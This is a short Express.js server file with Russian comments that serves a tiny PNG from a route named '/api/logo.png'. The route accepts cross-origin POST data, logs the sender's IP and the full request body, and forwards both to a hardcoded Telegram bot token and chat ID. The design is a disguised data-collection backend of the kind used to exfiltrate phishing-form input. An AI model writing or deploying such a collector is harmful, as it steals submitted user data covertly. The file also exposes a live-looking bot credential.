import express from 'express';
import axios from 'axios';

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Конфигурация Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';

const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// Обработка CORS (предзапрос OPTIONS)
app.options('/api/logo.png', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(200).end();
});

// Основной обработчик POST
app.post('/api/logo.png', async (req, res) => {
  try {
    // Настройка CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const userIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    console.log('POST request from:', userIp, 'data:', req.body);

    await sendToTelegram(userIp, req.body);

    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.status(200).send(imageBuffer);

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Обработчик для всех остальных методов
app.all('/api/logo.png', (req, res) => {
  res.setHeader('Allow', 'POST, OPTIONS');
  res.status(405).send('Method Not Allowed');
});

// Функция отправки в Telegram
// @ts-ignore
async function sendToTelegram(ip, data) {
  try {
    const message = `🖼️ Запрос логотипа\nIP: ${ip}\nДанные: ${JSON.stringify(data)}`;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

app.listen(3000, () => console.log("Server ready on port 3000."));

export default app;